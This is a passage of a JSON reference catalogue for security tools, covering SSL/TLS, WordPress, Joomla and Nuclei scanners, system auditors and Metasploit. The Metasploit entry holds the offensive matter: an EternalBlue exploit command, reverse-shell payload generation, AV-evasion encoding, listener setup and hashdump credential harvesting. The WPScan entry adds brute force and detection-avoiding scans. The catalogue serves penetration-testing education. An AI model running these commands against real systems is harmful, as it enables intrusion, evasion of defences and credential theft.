        "description": "Official usage and option reference."
      },
      {
        "label": "Tamper script catalog",
        "url": "https://github.com/sqlmapproject/sqlmap/tree/master/tamper",
        "description": "Overview of evasions you can combine during testing."
      }
    ]
  },
  {
    "id": "sslyze",
    "name": "SSLyze",
    "summary": "SSLyze is a powerful Python tool that can analyze the SSL configuration of a server by connecting to it and identifying any weaknesses.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "pip3 install sslyze",
            "copyable": true
          },
          {
            "detail": "sslyze --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed in some editions",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y python3-sslyze",
            "copyable": true
          },
          {
            "detail": "sslyze --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull nablac0d3/sslyze",
            "copyable": true
          },
          {
            "detail": "docker run --rm nablac0d3/sslyze --regular example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic SSL scan",
        "command": "python3 sslyze --regular example.com",
        "notes": []
      },
      {
        "description": "Scan specific port",
        "command": "python3 sslyze --regular example.com:8443",
        "notes": []
      },
      {
        "description": "Heartbleed check",
        "command": "python3 sslyze --heartbleed example.com",
        "notes": []
      },
      {
        "description": "Save results to JSON",
        "command": "python3 sslyze --json_out results.json example.com",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "--regular",
        "description": "Run regular scan suite"
      },
      {
        "flag": "--heartbleed",
        "description": "Check for Heartbleed vulnerability"
      },
      {
        "flag": "--openssl_ccs",
        "description": "Check for OpenSSL CCS injection"
      },
      {
        "flag": "--session_resumption",
        "description": "Test session resumption"
      },
      {
        "flag": "--json_out",
        "description": "Save results to JSON file"
      },
      {
        "flag": "--xml_out",
        "description": "Save results to XML file"
      }
    ],
    "operational_tips": [
      "Use --regular for comprehensive vulnerability scanning.",
      "Scan multiple ports for complete SSL coverage.",
      "Save results for documentation and reporting.",
      "Combine with other SSL tools for thorough analysis."
    ],
    "step_sequences": [
      {
        "title": "SSL/TLS configuration audit",
        "steps": [
          {
            "title": "Regular scan",
            "details": "Run all SSL/TLS checks.",
            "command": "sslyze --regular example.com:443"
          },
          {
            "title": "Certificate validation",
            "details": "Check certificate chain and trust.",
            "command": "sslyze --certinfo example.com"
          },
          {
            "title": "Vulnerability testing",
            "details": "Test for Heartbleed, POODLE, etc.",
            "command": "sslyze --heartbleed --sslv3 example.com"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "SSLyze \u2192 Report generation \u2192 Remediation",
        "stages": [
          {
            "label": "SSL audit",
            "description": "Scan all TLS aspects.",
            "command": "sslyze --regular example.com --json_out sslyze.json"
          },
          {
            "label": "Parse results",
            "description": "Extract vulnerabilities and weak ciphers.",
            "command": "jq '.server_scan_results[].scan_commands_results' sslyze.json"
          },
          {
            "label": "Retest fixes",
            "description": "Verify remediations.",
            "command": "sslyze --regular example.com"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "VULNERABLE - Server is vulnerable to Heartbleed",
        "meaning": "Critical vulnerability detected.",
        "severity": "critical"
      },
      {
        "indicator": "OK - TLS 1.3 Cipher Suites: TLS_AES_256_GCM_SHA384",
        "meaning": "Strong cipher suite configured.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Batch scanning with custom CA bundle",
        "command": "sslyze --targets_in hosts.txt --ca_file custom_ca.pem --json_out results.json",
        "scenario": "Scan multiple hosts and validate against custom certificate authority.",
        "notes": [
          "Use --mozilla_config=modern to compare against Mozilla TLS guidelines."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "testssl",
    "name": "TestSSL.sh",
    "summary": "TestSSL.sh is a free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as cryptographic flaws.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "git clone --depth 1 https://github.com/drwetter/testssl.sh.git",
            "copyable": true
          },
          {
            "detail": "cd testssl.sh",
            "copyable": true
          },
          {
            "detail": "./testssl.sh --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed or via apt",
        "steps": [
          {
            "detail": "sudo apt install -y testssl.sh",
            "copyable": true
          },
          {
            "detail": "testssl.sh --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull drwetter/testssl.sh",
            "copyable": true
          },
          {
            "detail": "docker run --rm drwetter/testssl.sh https://example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic SSL/TLS test",
        "command": "./testssl.sh example.com",
        "notes": []
      },
      {
        "description": "Test specific port",
        "command": "./testssl.sh example.com:8443",
        "notes": []
      },
      {
        "description": "Test only protocols",
        "command": "./testssl.sh --protocols example.com",
        "notes": []
      },
      {
        "description": "Generate HTML report",
        "command": "./testssl.sh --htmlfile report.html example.com",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "--protocols",
        "description": "Check TLS/SSL protocols"
      },
      {
        "flag": "--cipher",
        "description": "Check cipher suites"
      },
      {
        "flag": "--vulnerable",
        "description": "Test for vulnerabilities"
      },
      {
        "flag": "--htmlfile",
        "description": "Generate HTML report"
      },
      {
        "flag": "--jsonfile",
        "description": "Generate JSON report"
      },
      {
        "flag": "--quiet",
        "description": "Reduce output verbosity"
      },
      {
        "flag": "--fast",
        "description": "Fast scan mode"
      }
    ],
    "operational_tips": [
      "Use HTML reports for professional documentation.",
      "Fast mode is good for initial assessments.",
      "Test all ports that use SSL/TLS for complete coverage.",
      "Document findings for remediation tracking."
    ],
    "step_sequences": [
      {
        "title": "Comprehensive SSL/TLS auditing",
        "steps": [
          {
            "title": "Full test",
            "details": "Run all SSL/TLS checks including vulnerabilities.",
            "command": "./testssl.sh https://example.com"
          },
          {
            "title": "Specific protocol test",
            "details": "Check only TLS 1.3 support.",
            "command": "./testssl.sh -p tls1_3 example.com"
          },
          {
            "title": "Export results",
            "details": "Save in multiple formats.",
            "command": "./testssl.sh --htmlfile report.html --jsonfile report.json example.com"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "TestSSL \u2192 Vulnerability prioritization \u2192 Fix validation",
        "stages": [
          {
            "label": "Initial scan",
            "description": "Audit SSL/TLS configuration.",
            "command": "./testssl.sh --severity HIGH example.com | tee testssl.log"
          },
          {
            "label": "Extract issues",
            "description": "Identify critical and high findings.",
            "command": "grep -E 'CRITICAL|HIGH' testssl.log > issues.txt"
          },
          {
            "label": "Post-remediation",
            "description": "Verify fixes were effective.",
            "command": "./testssl.sh example.com"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "VULNERABLE (NOT ok): ROBOT",
        "meaning": "Server vulnerable to ROBOT attack.",
        "severity": "critical"
      },
      {
        "indicator": "TLS 1.3 (OK)",
        "meaning": "TLS 1.3 is properly supported.",
        "severity": "info"
      },
      {
        "indicator": "Certificate Expiration: 89 days",
        "meaning": "Certificate validity period.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Mass scanning with parallel execution",
        "command": "cat domains.txt | parallel -j 10 './testssl.sh --quiet --jsonfile {}.json {}'",
        "scenario": "Scan multiple domains in parallel for faster assessments.",
        "notes": [
          "Use --fast for quick scans that skip time-consuming tests."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "wpscan",
    "name": "WPScan",
    "summary": "WPScan is a black box WordPress vulnerability scanner written in Ruby that can be used to scan WordPress installations for security issues.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y ruby rubygems",
            "copyable": true
          },
          {
            "detail": "sudo gem install wpscan",
            "copyable": true
          },
          {
            "detail": "wpscan --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "wpscan --update",
            "copyable": true
          },
          {
            "detail": "wpscan -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull wpscanteam/wpscan",
            "copyable": true
          },
          {
            "detail": "docker run --rm wpscanteam/wpscan --url https://example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic WordPress scan",
        "command": "wpscan --url https://example.com",
        "notes": []
      },
      {
        "description": "Enumerate users",
        "command": "wpscan --url https://example.com --enumerate u",
        "notes": []
      },
      {
        "description": "Plugin enumeration",
        "command": "wpscan --url https://example.com --enumerate p",
        "notes": []
      },
      {
        "description": "Password attack",
        "command": "wpscan --url https://example.com --passwords wordlist.txt --usernames admin",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "--url",
        "description": "Target WordPress URL"
      },
      {
        "flag": "--enumerate",
        "description": "Enumeration options"
      },
      {
        "flag": "--plugins-detection",
        "description": "Plugin detection mode"
      },
      {
        "flag": "--passwords",
        "description": "Password list for brute force"
      },
      {
        "flag": "--usernames",
        "description": "Username list for brute force"
      },
      {
        "flag": "--api-token",
        "description": "WPVulnDB API token"
      },
      {
        "flag": "--output",
        "description": "Output file"
      }
    ],
    "operational_tips": [
      "Use API token for up-to-date vulnerability database.",
      "Enumerate users first, then attempt password attacks.",
      "Save results for later analysis and reporting.",
      "Be careful with brute force attempts to avoid lockouts."
    ],
    "step_sequences": [
      {
        "title": "WordPress security assessment",
        "steps": [
          {
            "title": "Basic scan",
            "details": "Enumerate WordPress version, themes, plugins.",
            "command": "wpscan --url https://example.com"
          },
          {
            "title": "Aggressive enumeration",
            "details": "Enumerate all plugins and users.",
            "command": "wpscan --url https://example.com --enumerate ap,u"
          },
          {
            "title": "Vulnerability detection",
            "details": "Check for known CVEs with API token.",
            "command": "wpscan --url https://example.com --api-token YOUR_TOKEN"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "WPScan \u2192 Credential brute force \u2192 Exploitation",
        "stages": [
          {
            "label": "Enumerate users",
            "description": "Discover WordPress usernames.",
            "command": "wpscan --url https://example.com --enumerate u -o users.txt"
          },
          {
            "label": "Brute force login",
            "description": "Attempt password attacks.",
            "command": "wpscan --url https://example.com -U users.txt -P passwords.txt"
          },
          {
            "label": "Exploit vulnerable plugin",
            "description": "Use Metasploit or manual exploit.",
            "command": "searchsploit wordpress plugin_name"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] WordPress version 5.8 identified",
        "meaning": "Outdated WordPress version detected.",
        "severity": "warning"
      },
      {
        "indicator": "[!] Title: Plugin XYZ <= 1.2.3 - SQL Injection",
        "meaning": "Vulnerable plugin found.",
        "severity": "critical"
      }
    ],
    "advanced_usage": [
      {
        "title": "Stealth scan with rate limiting",
        "command": "wpscan --url https://example.com --enumerate ap,u --throttle 5000 --random-user-agent",
        "scenario": "Slow down scan to avoid detection and use random user agents.",
        "notes": [
          "Register for free WPScan API token at https://wpscan.com/register"
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "joomscan",
    "name": "Joomscan",
    "summary": "Joomscan is a Joomla vulnerability scanner that can detect vulnerabilities, misconfigurations, and security issues in Joomla installations.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/OWASP/joomscan.git",
            "copyable": true
          },
          {
            "detail": "cd joomscan",
            "copyable": true
          },
          {
            "detail": "perl joomscan.pl -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed or install via git",
        "steps": [
          {
            "detail": "sudo apt install -y joomscan",
            "copyable": true
          },
          {
            "detail": "joomscan -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull vulnerscom/joomscan",
            "copyable": true
          },
          {
            "detail": "docker run --rm vulnerscom/joomscan -u https://example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic Joomla scan",
        "command": "joomscan -u https://example.com",
        "notes": []
      },
      {
        "description": "Scan with cookie",
        "command": "joomscan -u https://example.com -c 'session=abc123'",
        "notes": []
      },
      {
        "description": "Check for specific Joomla version",
        "command": "joomscan -u https://example.com --check-version",
        "notes": []
      },
      {
        "description": "Save scan results",
        "command": "joomscan -u https://example.com -o results.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-u",
        "description": "Target Joomla URL"
      },
      {
        "flag": "-c",
        "description": "Cookie string"
      },
      {
        "flag": "-p",
        "description": "Proxy server"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "--check-version",
        "description": "Check Joomla version"
      },
      {
        "flag": "--random-agent",
        "description": "Use random user agent"
      },
      {
        "flag": "--follow-redirect",
        "description": "Follow HTTP redirects"
      }
    ],
    "operational_tips": [
      "Update database regularly for latest signatures.",
      "Use cookies to scan authenticated areas.",
      "Check version against known vulnerabilities.",
      "Document all findings for remediation."
    ],
    "step_sequences": [
      {
        "title": "Joomla! security scanning",
        "steps": [
          {
            "title": "Basic scan",
            "details": "Identify Joomla version and components.",
            "command": "perl joomscan.pl -u https://example.com"
          },
          {
            "title": "Enumerate components",
            "details": "List installed extensions.",
            "command": "perl joomscan.pl -u https://example.com -ec"
          },
          {
            "title": "Check for vulnerabilities",
            "details": "Query vulnerability database.",
            "command": "perl joomscan.pl -u https://example.com -v"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Joomscan \u2192 Manual verification \u2192 Exploitation",
        "stages": [
          {
            "label": "Initial scan",
            "description": "Enumerate Joomla installation.",
            "command": "perl joomscan.pl -u https://example.com -ec > joomscan.txt"
          },
          {
            "label": "CVE lookup",
            "description": "Search for known exploits.",
            "command": "searchsploit joomla component_name"
          },
          {
            "label": "Manual testing",
            "description": "Verify vulnerabilities manually.",
            "command": "curl https://example.com/components/com_vuln/exploit.php"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[++] Joomla version: 3.9.12",
        "meaning": "Joomla version identified; check for CVEs.",
        "severity": "info"
      },
      {
        "indicator": "[++] Component: com_content [version 3.9.0]",
        "meaning": "Component enumerated; research vulnerabilities.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Deep component enumeration with proxy",
        "command": "perl joomscan.pl -u https://example.com -ec --proxy http://127.0.0.1:8080",
        "scenario": "Route scan through Burp Suite for request analysis.",
        "notes": [
          "Use --cookie for authenticated scanning."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "nuclei",
    "name": "Nuclei",
    "summary": "Nuclei is a fast and customizable vulnerability scanner based on simple YAML based DSL that enables you to detect vulnerabilities in misconfigurations.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
            "copyable": true
          },
          {
            "detail": "export PATH=$PATH:~/go/bin",
            "copyable": true
          },
          {
            "detail": "nuclei -version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed or via Go",
        "steps": [
          {
            "detail": "sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull projectdiscovery/nuclei",
            "copyable": true
          },
          {
            "detail": "docker run --rm projectdiscovery/nuclei -u https://example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic vulnerability scan",
        "command": "nuclei -u https://example.com",
        "notes": []
      },
      {
        "description": "Scan with specific template",
        "command": "nuclei -u https://example.com -id CVE-2021-44228",
        "notes": []
      },
      {
        "description": "Scan multiple targets",
        "command": "nuclei -l targets.txt -severity critical,high",
        "notes": []
      },
      {
        "description": "Scan with custom templates",
        "command": "nuclei -u https://example.com -t custom_templates/",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-u",
        "description": "Target URL"
      },
      {
        "flag": "-l",
        "description": "File with target URLs"
      },
      {
        "flag": "-t",
        "description": "Template directory or file"
      },
      {
        "flag": "-id",
        "description": "Specific template ID"
      },
      {
        "flag": "-severity",
        "description": "Filter by severity level"
      },
      {
        "flag": "-json",
        "description": "JSON output format"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-rate-limit",
        "description": "Requests per second"
      }
    ],
    "operational_tips": [
      "Keep templates updated for latest vulnerability checks.",
      "Use severity filters to focus on critical findings.",
      "Create custom templates for organization-specific checks.",
      "Combine with other scanners for comprehensive coverage."
    ],
    "step_sequences": [
      {
        "title": "Automated vulnerability scanning",
        "steps": [
          {
            "title": "Update templates",
            "details": "Pull latest templates from repository.",
            "command": "nuclei -update-templates"
          },
          {
            "title": "Basic scan",
            "details": "Scan single target with all templates.",
            "command": "nuclei -u https://example.com"
          },
          {
            "title": "CVE-focused scan",
            "details": "Test only for known CVEs.",
            "command": "nuclei -u https://example.com -t cves/"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Subdomain enum \u2192 HTTP probing \u2192 Nuclei scanning",
        "stages": [
          {
            "label": "Discover subdomains",
            "description": "Use Subfinder or Amass.",
            "command": "subfinder -d example.com -o subs.txt"
          },
          {
            "label": "Probe for HTTP",
            "description": "Find live web services.",
            "command": "httpx -l subs.txt -o live.txt"
          },
          {
            "label": "Vulnerability scan",
            "description": "Run Nuclei templates.",
            "command": "nuclei -l live.txt -t cves/ -t vulnerabilities/ -o nuclei_findings.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[CVE-2021-12345] [high] https://example.com/path",
        "meaning": "Critical CVE detected on target.",
        "severity": "critical"
      },
      {
        "indicator": "[tech-detect:wordpress] https://example.com",
        "meaning": "Technology identified; useful for targeted testing.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom template execution with rate limiting",
        "command": "nuclei -u https://example.com -t custom_templates/ -rl 150 -c 25 -severity critical,high -o findings.json -json",
        "scenario": "Run custom templates with controlled request rate and concurrency.",
        "notes": [
          "Create custom templates in YAML format for specific vulnerabilities."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "lynis",
    "name": "Lynis",
    "summary": "Lynis is a security auditing tool for UNIX derivatives like Linux, macOS, BSD, Solaris, AIX, and others.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "steps": [
          {
            "detail": "sudo apt install lynis",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Install from source",
        "steps": [
          {
            "detail": "git clone https://github.com/CISOfy/lynis.git",
            "copyable": true
          },
          {
            "detail": "cd lynis",
            "copyable": true
          },
          {
            "detail": "chmod +x lynis",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Run from directory",
        "steps": [
          {
            "detail": "./lynis audit system",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Full system audit",
        "command": "lynis audit system",
        "notes": []
      },
      {
        "description": "Scan specific directory",
        "command": "lynis audit system --scan-dir /opt/app",
        "notes": []
      },
      {
        "description": "Quick scan with warnings only",
        "command": "lynis audit system --quick --warnings-only",
        "notes": []
      },
      {
        "description": "Generate HTML report",
        "command": "lynis audit system --report-file /tmp/lynis-report.html",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "audit system",
        "description": "Perform full system audit"
      },
      {
        "flag": "--scan-dir",
        "description": "Scan specific directory"
      },
      {
        "flag": "--quick",
        "description": "Quick scan mode"
      },
      {
        "flag": "--warnings-only",
        "description": "Show only warnings"
      },
      {
        "flag": "--report-file",
        "description": "Output report file"
      },
      {
        "flag": "--tests",
        "description": "Run specific tests"
      },
      {
        "flag": "--check-all",
        "description": "Check all tests"
      }
    ],
    "operational_tips": [
      "Run as root for comprehensive system access.",
      "Review warnings and suggestions for hardening.",
      "Create baseline scans for change detection.",
      "Document findings for security compliance."
    ],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "unix-privesc-check",
    "name": "Unix-Privesc-Check",
    "summary": "Unix-Privesc-Check is a script to check for common privilege escalation vectors on Unix/Linux systems.",
    "installation_guides": [
      {
        "platform": "Install from git",
        "steps": [
          {
            "detail": "git clone https://github.com/pentestmonkey/unix-privesc-check.git",
            "copyable": true
          },
          {
            "detail": "cd unix-privesc-check",
            "copyable": true
          },
          {
            "detail": "chmod +x unix-privesc-check",
            "copyable": true
          },
          {
            "detail": "./unix-privesc-check --help",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic privilege escalation check",
        "command": "./unix-privesc-check",
        "notes": []
      },
      {
        "description": "Detailed verbose output",
        "command": "./unix-privesc-check -v",
        "notes": []
      },
      {
        "description": "Check specific directory",
        "command": "./unix-privesc-check -d /home/user",
        "notes": []
      },
      {
        "description": "Save results to file",
        "command": "./unix-privesc-check -o results.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-v",
        "description": "Verbose output"
      },
      {
        "flag": "-d",
        "description": "Check specific directory"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-t",
        "description": "Test mode"
      },
      {
        "flag": "-h",
        "description": "Show help"
      }
    ],
    "operational_tips": [
      "Run as different users for comprehensive coverage.",
      "Document all potential privilege escalation paths.",
      "Combine with manual verification of findings.",
      "Use results for system hardening recommendations."
    ],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "metasploit",
    "name": "Metasploit Framework",
    "summary": "Metasploit Framework is a powerful open-source platform for developing, testing, and executing exploits against remote targets.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install the metasploit-framework package and initialize PostgreSQL for module caching.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y metasploit-framework postgresql",
            "copyable": true
          },
          {
            "detail": "sudo systemctl enable --now postgresql && msfdb init",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Use msfupdate on Kali and keep the backing database in sync with the rolling release.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y metasploit-framework",
            "copyable": true
          },
          {
            "detail": "sudo systemctl start postgresql && sudo systemctl enable postgresql",
            "copyable": true
          },
          {
            "detail": "msfupdate && msfconsole -q -x \"version\"",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run msfconsole inside the official container when isolation or older versions are required.",
        "steps": [
          {
            "detail": "docker pull metasploitframework/metasploit-framework",
            "copyable": true
          },
          {
            "detail": "docker volume create msf-data",
            "copyable": true
          },
          {
            "detail": "docker run -it --rm -v msf-data:/home/msf/.msf4 metasploitframework/metasploit-framework",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch Metasploit console",
        "command": "msfconsole",
        "notes": []
      },
      {
        "description": "Search for exploits",
        "command": "msfconsole -q -x 'search eternalblue'",
        "notes": []
      },
      {
        "description": "Use specific exploit",
        "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; exploit'",
        "notes": []
      },
      {
        "description": "Generate payload",
        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe",
        "notes": []
      },
      {
        "description": "Run auxiliary scanner module",
        "command": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS 192.168.1.0/24; run'",
        "notes": []
      },
      {
        "description": "Generate PHP reverse shell",
        "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw > shell.php",
        "notes": []
      },
      {
        "description": "Run resource script for automation",
        "command": "msfconsole -r attack_script.rc",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-q",
        "description": "Quiet mode"
      },
      {
        "flag": "-x",
        "description": "Execute commands"
      },
      {
        "flag": "-r",
        "description": "Resource script file"
      },
      {
        "flag": "-E",
        "description": "Environment variables"
      },
      {
        "flag": "-y",
        "description": "Answer yes to prompts"
      },
      {
        "flag": "-a",
        "description": "Architecture"
      },
      {
        "flag": "-p",
        "description": "Platform"
      }
    ],
    "operational_tips": [
      "Keep database updated for latest exploits with msfupdate.",
      "Use resource scripts for automated workflows and repeatable attacks.",
      "Document all exploitation attempts and results in your engagement notes.",
      "Be aware of legal and ethical considerations - always get authorization.",
      "Use workspaces to separate different targets and engagements.",
      "Enable logging for all sessions to capture all post-exploitation activity.",
      "Understand payload encoders and encryption to bypass AV/EDR.",
      "Use auxiliary modules for reconnaissance before exploitation.",
      "Test payloads in sandboxed environments before deployment."
    ],
    "step_sequences": [
      {
        "title": "Exploit module execution playbook",
        "steps": [
          {
            "title": "Prime the database",
            "details": "Confirm the PostgreSQL-backed workspace is ready for loot, hosts, and creds.",
            "command": "msfdb reinit"
          },
          {
            "title": "Identify a matching module",
            "details": "Search by CVE, platform, or check results imported from nmap/db_nmap.",
            "command": "msfconsole -q -x \"search type:exploit cve:2023-34362\""
          },
          {
            "title": "Configure exploit and payload",
            "details": "Set target hosts, listener interface, and any required URI or key material.",
            "command": "msfconsole -q -x \"use exploit/multi/http/manageengine_sdp_cve2023_34362; set RHOSTS 10.0.5.23; set LHOST tun0; set LPORT 4444; set TARGETURI /sdp\""
          },
          {
            "title": "Execute and manage sessions",
            "details": "Run the exploit, then interact with or background resulting sessions for post-ex.",
            "command": "msfconsole -q -x \"run -j; sessions -i 1\""
          }
        ]
      },
      {
        "title": "Auxiliary module scanning workflow",
        "steps": [
          {
            "title": "Select auxiliary scanner",
            "details": "Choose an appropriate auxiliary module for service enumeration or vulnerability scanning.",
            "command": "msfconsole -q -x \"search type:auxiliary scanner\""
          },
          {
            "title": "Configure target range",
            "details": "Set RHOSTS to your target network or specific hosts.",
            "command": "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; set THREADS 10"
          },
          {
            "title": "Execute scan",
            "details": "Run the auxiliary module and review results stored in the database.",
            "command": "run"
          },
          {
            "title": "Review database results",
            "details": "Query the database for discovered hosts and services.",
            "command": "hosts; services; vulns"
          }
        ]
      },
      {
        "title": "Payload generation with msfvenom",
        "steps": [
          {
            "title": "List available payloads",
            "details": "Browse payloads for your target platform and desired connection type.",
            "command": "msfvenom --list payloads | grep windows/meterpreter"
          },
          {
            "title": "Generate encoded payload",
            "details": "Create payload with encoding to evade basic AV detection.",
            "command": "msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe"
          },
          {
            "title": "Set up handler",
            "details": "Configure Metasploit to catch the incoming connection.",
            "command": "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST 10.10.14.5; set LPORT 443; exploit -j\""
          },
          {
            "title": "Deploy and execute",
            "details": "Transfer payload to target and execute, then interact with session.",
            "command": "sessions -i 1"
          }
        ]
      },
      {
        "title": "Post-exploitation module execution",
        "steps": [
          {
            "title": "Background active session",
            "details": "Move your Meterpreter session to background for module execution.",
            "command": "background"
          },
          {
            "title": "Select post module",
            "details": "Choose post-exploitation module for credential harvesting or enumeration.",
            "command": "use post/windows/gather/hashdump"
          },
          {
            "title": "Set session target",
            "details": "Specify which session to run the post module against.",
            "command": "set SESSION 1"
          },
          {
            "title": "Execute and review loot",
            "details": "Run the module and check captured credentials or data.",
            "command": "run; loot"
          }
        ]
      },
      {
        "title": "Database and workspace management",
        "steps": [
          {
            "title": "Create new workspace",
            "details": "Separate engagements or targets into isolated workspaces.",
            "command": "workspace -a client_pentest_2024"
          },
          {
            "title": "Import scan data",
            "details": "Load nmap XML or other tool outputs into the database.",
            "command": "db_import /path/to/nmap_scan.xml"
          },
          {
            "title": "Query database",
            "details": "Review imported hosts, services, and discovered vulnerabilities.",
            "command": "hosts -c address,os_name; services -c port,proto,name,info; vulns"
          },
          {
            "title": "Export workspace data",
            "details": "Save workspace data for reporting or backup.",
            "command": "db_export -f xml /path/to/export.xml"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Recon to exploitation to post-ex",
        "stages": [
          {
            "label": "Service discovery",
            "description": "Import nmap results for context.",
            "command": "nmap -sV -oX scans/services.xml 10.0.5.0/24 && db_import scans/services.xml"
          },
          {
            "label": "Exploit selection",
            "description": "Correlate SearchSploit output with Metasploit modules.",
            "command": "searchsploit --nmap scans/services.xml"
          },
          {
            "label": "Post-ex deployment",
            "description": "Use Meterpreter to drop WinPEAS/LinPEAS for privilege escalation.",
            "command": "upload /opt/linpeas.sh /tmp && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
          }
        ]
      },
      {
        "name": "Resource script automation workflow",
        "stages": [
          {
            "label": "Create resource script",
            "description": "Write .rc file with sequential commands for repeatable attacks.",
            "command": "echo 'use exploit/multi/handler\\nset payload windows/meterpreter/reverse_tcp\\nset LHOST 10.10.14.5\\nset LPORT 4444\\nexploit -j' > handler.rc"
          },
          {
            "label": "Execute resource script",
            "description": "Launch msfconsole with the resource file to automate setup.",
